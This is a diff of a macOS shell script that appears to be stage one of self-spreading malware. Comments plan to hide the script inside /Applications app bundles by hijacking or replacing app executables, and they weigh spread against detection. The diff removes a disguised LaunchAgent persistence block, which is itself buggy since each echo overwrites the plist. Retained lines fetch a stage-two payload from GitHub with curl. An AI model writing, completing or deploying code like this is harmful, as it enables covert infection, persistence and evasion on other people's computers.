@@ -24,18 +24,6 @@
 #Variable for this script (may not work)
 CURDIR=$(pwd)
 THISSCRIPT="${CURDIR}$0"
-#Variables for the LaunchAgent (this system may be abolished in the future)
-VONE=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 3 | head -n 1)
-#Randomly generated, except the amount of characters will vary (may not work)
-VTWO=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 256 | head -n 1 | sed -e 's/^0*//' | head --bytes 9)
-if [ "$VTWO" == "" ]; then
-  VTWO=a
-fi
-VTHREE=$(cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 256 | head -n 1 | sed -e 's/^0*//' | head --bytes 9)
-if [ "$VTHREE" == "" ]; then
-  VTHREE=a
-fi
-LABEL="$VONE.$VTWO.$VTHREE"
 
 #We need a dir for hiding this/the/a script which everyone can read and write to/from (without SIP disabled 
 #or sudo perms). The directory /Applications/ is a good fit for this. 
@@ -44,16 +32,8 @@ LABEL="$VONE.$VTWO.$VTHREE"
 #[1] Changing the app's Info.plist to launch the script, which will be a . file in the MacOS dir of the app
 #[2] Renaming the app's executable and copying the script to where the executable was
 #[3] Just hiding the script as a hidden file somewhere in the app's dir
-#For solution number one and two, the script will launch the app's (actual) executable sometime while running,
-#but since we don't want the app's executable to launch when the LaunchAgent is run, the script and plist will
-#have to have an argument (-no) which will prevent the running of the executable. This is all doable, and will
-#probably spread/be run more often than solution three, especially if the app is a commonly used one.
-#For solution number three, the script will only run on login or startup (not sure which), meaning that it'll 
-#likely be spread more slowly/ran less often, but may be less likely to be found/detected.
-#All three solutions will work, and maybe be used depending on what protection the app has.
-#
-#Thinking on it now, I think that I'll use method one for protected applications, method two for unprotexted
-#applications, and method three for Stage 2
+#For solution number one and two, the script will run the actual executable on the last line of the script.
+#Solution number three won't be used for stage one, if at all.
 
 #Duplication:
 #
@@ -157,29 +137,6 @@ else
   curl https://raw.githubusercontent.com/The-SamminAter/lol-limewire/master/stage-2.sh > ./stage-2.sh
 fi
 #Running Stage 2:
-#I could use 'open', but that might reveal this. I could alternatively just run the script, but that would
-#prevent the executable from being run in solution one and two, as the lines for that will have been echo'd 
-#onto the end of the duplicate of this script.
-
-#LaunchAgent creation:
-#If this doesn't work, it can be transitiond to printf (w/ /n)
-#The touch is probably unneccesary
-touch "/Library/LaunchAgents/${LABEL}.plist"
-echo "<?xml version="1.0" encoding="UTF-8"?>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "<plist version="1.0">" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "<dict>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <key>Label</key>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <string>$LABEL</string>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <key>Program</key>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <string>${SPRIPTPATH}</string>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <key>ProgramArguments</key>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <array>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "        <string>-no</string>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    </array>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <key>KeepAlive</key>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "    <true/>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "</dict>" > "/Library/LaunchAgents/${LABEL}.plist"
-echo "</plist>" > "/Library/LaunchAgents/${LABEL}.plist"
+#I can probably just hand it off by running ./stage-2.sh or whatever.
 
 #LAST LINE
